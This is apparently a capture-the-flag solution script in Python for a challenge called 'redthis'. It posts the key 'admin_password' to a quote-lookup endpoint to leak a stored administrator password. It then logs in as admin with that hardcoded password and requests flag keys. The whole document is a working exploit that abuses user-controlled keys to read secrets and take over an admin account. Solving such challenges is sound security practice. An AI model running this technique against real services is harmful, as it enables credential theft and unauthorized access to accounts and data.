import requests 

URL = "https://redthis.chal.cyberjousting.com" 

# login 
# r = requests.get

r = requests.post(
    f"{URL}/get_quote", 
    data={
        "famous_person": "admin_password"
    }
)

print(r.text) 

ADMIN_PASSWORD = "I_HopeYou4re8admin_iLoveTechn070g_9283910" 

s = requests.session() 
r = s.post(
    f"{URL}/login", 
    data={
        "username": "admin", 
        "password": ADMIN_PASSWORD 
    }
)

r = s.post(
    f"{URL}/get_quote", 
    data={
        "famous_person": "flag_"
    }
)

print(r.text)
print(r.status_code)

r = s.post(
    f"{URL}/get_quote", 
    data={
        "famous_person": "flag_7392ilj8i32"
    }
)

print(r.text)
print(r.status_code)